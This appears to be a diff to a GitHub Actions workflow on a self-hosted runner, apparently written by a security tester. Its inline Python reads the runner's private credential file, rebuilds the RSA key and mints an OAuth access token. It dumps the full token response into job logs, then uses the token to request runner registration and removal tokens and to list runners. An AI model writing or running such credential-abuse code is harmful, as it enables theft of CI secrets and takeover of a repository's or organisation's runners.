@@ -4,7 +4,7 @@ jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: OAuth2 Token Exchange
+      - name: OAuth2 Token Exchange Fixed
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
@@ -15,7 +15,7 @@ jobs:
           import urllib.request, urllib.parse, urllib.error
           from cryptography.hazmat.backends import default_backend
           from cryptography.hazmat.primitives.asymmetric.rsa import (
-              RSAPrivateNumbers, RSAPublicNumbers, rsa_crt_iqmp, rsa_crt_dmp1, rsa_crt_dmq1
+              RSAPrivateNumbers, RSAPublicNumbers
           )
           
           with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
@@ -47,23 +47,19 @@ jobs:
               public_numbers=RSAPublicNumbers(e=e, n=n)
           )
           private_key = private_numbers.private_key(default_backend())
-          print('RSA Key Built!')
           
           client_id = creds['data']['clientId']
           auth_url = creds['data']['authorizationUrl']
           
-          print('Auth URL:', auth_url)
-          print('Client ID:', client_id)
-          
-          # Step 1: Create JWT for client assertion
+          # Step 1: Create JWT - MAX 5 MINUTES
           now = int(time.time())
           payload = {
               'sub': client_id,
               'iss': client_id,
               'aud': auth_url,
               'iat': now,
-              'exp': now + 600,
-              'jti': str(time.time())
+              'exp': now + 270,  # 4.5 minutes to be safe
+              'jti': str(now)
           }
           
           client_assertion = jwt.encode(
@@ -71,10 +67,9 @@ jobs:
               private_key,
               algorithm='RS256'
           )
-          print('Client Assertion JWT:', client_assertion[:50], '...')
+          print('JWT Generated Successfully!')
           
-          # Step 2: Exchange JWT for access token
-          # Using OAuth2 client_credentials with JWT assertion
+          # Step 2: OAuth2 Token Exchange
           form_data = urllib.parse.urlencode({
               'grant_type': 'client_credentials',
               'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
@@ -82,7 +77,7 @@ jobs:
               'client_id': client_id
           }).encode()
           
-          print('\n=== TRYING OAuth2 Token Exchange ===')
+          print('\n=== OAuth2 Token Exchange ===')
           try:
               req = urllib.request.Request(
                   auth_url,
@@ -98,27 +93,35 @@ jobs:
                   print('TOKEN EXCHANGE SUCCESS!')
                   print(json.dumps(token_response, indent=2))
                   
-                  # Step 3: Use access token to get runner registration token
                   access_token = token_response.get('access_token', '')
-                  print('\nAccess Token:', access_token[:50], '...')
+                  token_type = token_response.get('token_type', 'Bearer')
                   
-                  # Try registration endpoints with new token
+                  print('\nAccess Token Obtained!')
+                  
+                  # Step 3: Try All Endpoints With New Token
                   endpoints = [
-                      'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token',
-                      'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token',
+                      ('REPO REG TOKEN', 'POST', 
+                       'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token'),
+                      ('ORG REG TOKEN', 'POST',
+                       'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token'),
+                      ('REPO REMOVE TOKEN', 'POST',
+                       'https://api.github.com/repos/${{ github.repository }}/actions/runners/remove-token'),
+                      ('LIST RUNNERS', 'GET',
+                       'https://api.github.com/repos/${{ github.repository }}/actions/runners'),
                   ]
                   
-                  for ep in endpoints:
-                      print(f'\n=== TRYING {ep} ===')
+                  for name, method, ep in endpoints:
+                      print(f'\n=== {name} ===')
+                      print(f'URL: {ep}')
                       try:
                           reg_req = urllib.request.Request(
                               ep,
-                              method='POST',
-                              data=b'',
+                              method=method,
+                              data=b'' if method == 'POST' else None,
                               headers={
-                                  'Authorization': f'Bearer {access_token}',
+                                  'Authorization': f'{token_type} {access_token}',
                                   'Accept': 'application/vnd.github.v3+json',
-                                  'Content-Length': '0'
+                                  'Content-Length': '0' if method == 'POST' else ''
                               }
                           )
                           with urllib.request.urlopen(reg_req) as reg_resp:
